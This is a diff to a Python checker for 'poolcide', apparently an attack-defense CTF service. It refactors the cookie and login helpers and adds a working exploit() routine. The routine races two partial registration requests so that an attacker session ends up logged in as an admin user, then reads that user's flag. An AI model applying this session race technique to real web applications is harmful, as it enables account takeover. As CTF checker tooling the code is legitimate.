@@ -5,6 +5,7 @@ import secrets
 import string
 import subprocess
 import urllib.parse
+import socket
 
 from enochecker import BaseChecker, run
 from enochecker.utils import *
@@ -16,6 +17,8 @@ AGE_SECRET_KEY = (
 )
 
 AGE_KEYFILE = "./age_key"
+
+COOKIE = "poolcode"
 
 with open("users.txt") as f:
     # users must not include '=', or '&' chars
@@ -103,7 +106,7 @@ class PoolcideChecker(BaseChecker):
         response = ensure_unicode(response)
         try:
             cookie = (
-                response.split("Set-Cookie:")[1].split("poolcode=")[1].split(";")[0]
+                response.split("Set-Cookie:")[1].split(f"{COOKIE}=")[1].split(";")[0]
             )
         except Exception as ex:
             self.warning(f"Cookie not found in resp: <<{response}>>: {ex}")
@@ -121,7 +124,7 @@ class PoolcideChecker(BaseChecker):
             http = build_http(
                 method="POST",
                 query_params={"route": route},
-                cookies={"poolcode": cookie},
+                cookies={COOKIE: cookie},
                 body_params={"username": username, "password": password, "csrf": csrf},
             )
             self.debug(f"Sending request: {http}")
@@ -139,13 +142,17 @@ class PoolcideChecker(BaseChecker):
             return resp, cookie, csrf
 
     def login(
-        self, cookie: str, csrf: str, username: str, password: str
+        self, username: str, password: str, cookies: Dict[str, str] = {}
     ) -> Tuple[str, str, str]:
+        resp, cookie, csrf = self.request_index(cookies)
+        self.info("trying to log in")
         return self.user_request("login", cookie, csrf, username, password)
 
     def register(
-        self, cookie: str, csrf: str, username: str, password: str
+        self, username: str, password: str, cookies: Dict[str, str] = {}
     ) -> Tuple[str, str, str]:
+        resp, cookie, csrf = self.request_index(cookies)
+        self.info("trying to register")
         return self.user_request("register", cookie, csrf, username, password)
 
     def reserve(self, cookie: str, as_admin: bool) -> None:
@@ -154,7 +161,7 @@ class PoolcideChecker(BaseChecker):
             http = build_http(
                 method="GET",
                 query_params={"route": "dispense"},
-                cookies={"poolcode": cookie},
+                cookies={COOKIE: cookie},
             )
             self.debug(f"request for dispense: {http}")
             t.write(http)
@@ -174,7 +181,7 @@ class PoolcideChecker(BaseChecker):
                 method=method,
                 query_params={"route": "reserve"},
                 params={"color": color_string, "csrf": csrf},
-                cookies={"poolcode": cookie},
+                cookies={COOKIE: cookie},
             )
             t.write(http)
             stuff = t.read_until("<code>")
@@ -231,7 +238,7 @@ class PoolcideChecker(BaseChecker):
                 f"Getting flag with towel_token {towel_token.strip()} and cookie {cookie}"
             )
             t.write(
-                f"GET /cgi-bin/poolcide/poolcide?route=towel&token={towel_token.strip()}\r\nCookie: poolcode={cookie}\r\n\r\n"
+                f"GET /cgi-bin/poolcide/poolcide?route=towel&token={towel_token.strip()}\r\nCookie: {COOKIE}={cookie}\r\n\r\n"
             )
             resp = t.read_all()
             self.debug(f"Got return {resp}")
@@ -242,10 +249,8 @@ class PoolcideChecker(BaseChecker):
         password = self.random_password()
         self.team_db[self.flag] = {"user": user, "password": password}
         self.info(f"Random username: {user}, random password {password}")
-        resp, cookie, csrf = self.request_index()
-        self.info("trying to log in")
-        resp, cookie, csrf = self.register(cookie, csrf, user, password)
-        self.info(f"Logged in as {user}")
+        resp, cookie, csrf = self.register(user, password)
+        self.info(f"Registered as {user}")
 
         self.reserve(cookie, as_admin=True)
 
@@ -260,9 +265,7 @@ class PoolcideChecker(BaseChecker):
                 "No stored credentials from putflag in getflag"
             )
 
-        resp, cookie, csrf = self.request_index()
-
-        resp, cookie, csrf = self.login(cookie, csrf, user, password)
+        resp, cookie, csrf = self.login(user, password)
         resp = self.get_towel(cookie, towel_token)
         try:
             escaped_flag = resp.split('<code id="color">')[1].split("</code>")[0]
@@ -296,10 +299,8 @@ class PoolcideChecker(BaseChecker):
         user = self.random_user()
         password = self.random_password()
         self.info(f"Random username: {user}, random password {password}")
-        resp, cookie, csrf = self.request_index()
-        self.info("trying to log in")
-        resp, cookie, csrf = self.register(cookie, csrf, user, password)
-        self.info(f"Logged in as {user}")
+        resp, cookie, csrf = self.register(user, password)
+        self.info(f"Registered as {user}")
 
         self.team_db[self.flag] = {"user": user, "password": password, "cookie": cookie}
 
@@ -318,13 +319,12 @@ class PoolcideChecker(BaseChecker):
             )
 
         if self.flag_idx % 2:
-            cookies = {"poolcode": cookie}
+            cookies = {COOKIE: cookie}
             resp, cookie, csrf = self.request_index(cookies)
-            assert_equals(cookie, cookies["poolcode"])
+            assert_equals(cookie, cookies[COOKIE])
         else:
             # do a fresh login.
-            resp, cookie, csrf = self.request_index()
-            resp, cookie, csrf = self.login(cookie, csrf, user, password)
+            resp, cookie, csrf = self.login(user, password)
         resp = self.get_towel(cookie, towel_token)
         try:
             escaped_flag = resp.split('<code id="color">')[1].split("</code>")[0]
@@ -344,27 +344,139 @@ class PoolcideChecker(BaseChecker):
             resp = self.http_get("cgi-bin/")
             assert_in("FORBIDDEN", resp.text, "Diret access to cgi-bin not FORBIDDEN")
 
-    def exploit(self) -> None:
-        # Step 1: get all available admin ids
-        user = self.random_user()
-        password = self.random_password()
-        self.info(f"Random username: {user}, random password {password}")
-        resp, cookie, csrf = self.request_index()
-        self.info("trying to log in")
-        resp, cookie, csrf = self.register(cookie, csrf, user, password)
+    def get_admin_list(
+        self, user: Optional[str] = None, password: Optional[str] = None
+    ):
+        """
+        Parses the towels fom dispense and gets the admin towels
+        :param user:
+        :param password:
+        :return: (name, towel_id)
+        """
+        if not user:
+            user = self.random_user()
+        if not password:
+            user = self.random_password()
+        resp, cookie, csrf = self.register(user, password)
         self.info(f"Logged in as {user}")
 
         with self.connect() as t:
             http = build_http(
                 method="GET",
                 query_params={"route": "dispense"},
-                cookies={"poolcode": cookie},
+                cookies={COOKIE: cookie},
             )
             self.debug(f"request for dispense: {http}")
             t.write(http)
             resp = ensure_unicode(t.read_all())
-            self.debug(f"response for dispense was {resp}")
-            self.error("finish exploit...")
+
+        self.debug(f"response for dispense was {resp}")
+
+        print(resp)
+
+        try:
+            adminslist = [
+                (x.split("// ")[1].split("</a></li>")[0], x.split("</strong> ")[0])
+                for x in resp.split("<strong>")[1:]
+            ]
+        except Exception as ex:
+            raise BrokenServiceException("Could not parse towellist")
+        return adminslist
+
+    def exploit(self) -> None:
+        self.info("Step 1: get all available admin ids")
+        admin_list = self.get_admin_list()
+        self.info(f"admins: {admin_list}")
+
+        found_flags = []
+        failed = []
+
+        for (admin_name, towel_id) in admin_list:
+            try:
+                self.info(
+                    f"Step 2: Start logging in as admin user with name {admin_name}"
+                )
+                resp, cookie, csrf = self.request_index()
+
+                self.info("Step 3: Start registering a user - but without password")
+                resp, cookie, csrf = self.request_index(cookies={COOKIE: cookie})
+
+                self.debug(f"Cookie is {cookie}")
+
+                sock_reg = self.connect()
+
+                http_reg = build_http(
+                    method="POST",
+                    query_params={"route": "register"},
+                    cookies={COOKIE: cookie},
+                    body_params={
+                        "username": f"ATTACKER{self.random_user()}",
+                        "csrf": csrf,
+                    },
+                )
+
+                # Write some dummy data to make sure our stuff got sent
+                sock_reg.write(http_reg)
+                time.sleep(0.007)
+                sock_reg.write("\n\n\n\n\n")
+                time.sleep(0.007)
+                sock_reg.read_eager()
+
+                self.info(
+                    "Step 4: Start registering the admin user (don't send the password) to set username"
+                )
+
+                sock_admin = self.connect()
+                resp, cookie, csrf = self.request_index(cookies={COOKIE: cookie})
+
+                http_admin = build_http(
+                    method="POST",
+                    query_params={"route": "register"},
+                    cookies={COOKIE: cookie},
+                    body_params={"username": admin_name, "csrf": csrf},
+                )
+                sock_admin.write(http_admin)
+
+                time.sleep(0.007)
+                sock_admin.write("\n\n\n\n\n")
+                time.sleep(0.007)
+                sock_admin.read_eager()
+
+                self.debug("step 5: finish register to set logged_in to 1")
+                sock_reg.write(f"password={self.random_password()}\n")
+                self.debug("Register complete. Should be logged in now.")
+                self.debug(f"Register response: {sock_reg.read_all()}")
+                sock_reg.close()
+                self.info(
+                    "Now we should be logged in with the admin username. Get the towel!"
+                )
+
+                self.info(f"Final step - we are logged in as admin, read the flag.")
+                get_flag = build_http(
+                    method="POST",
+                    query_params={"route": "towel", "token": towel_id},
+                    cookies={COOKIE: cookie},
+                )
+                sock_flag = self.connect()
+                sock_flag.write(get_flag)
+                flag_response = ensure_unicode(sock_flag.read_all())
+                self.debug(f"Flag response: {flag_response}")
+
+                flag_enc = flag_response.split('id="color">')[1].split("</code>")[0]
+                flag = urllib.parse.unquote(html.unescape(flag_enc))
+                self.warning(f"Found FLAG: {flag}")
+                found_flags.append(flag)
+
+                sock_reg.close()
+                sock_admin.close()
+                sock_flag.close()
+            except Exception as ex:
+                self.error(
+                    f"Could not get flag with towel_id {towel_id} for user {admin_name}: {ex}"
+                )
+                failed.append(admin_name)
+
+        self.info(f"Got {len(found_flags)} flags and failed for {len(failed)}")
 
 
 app = PoolcideChecker.service
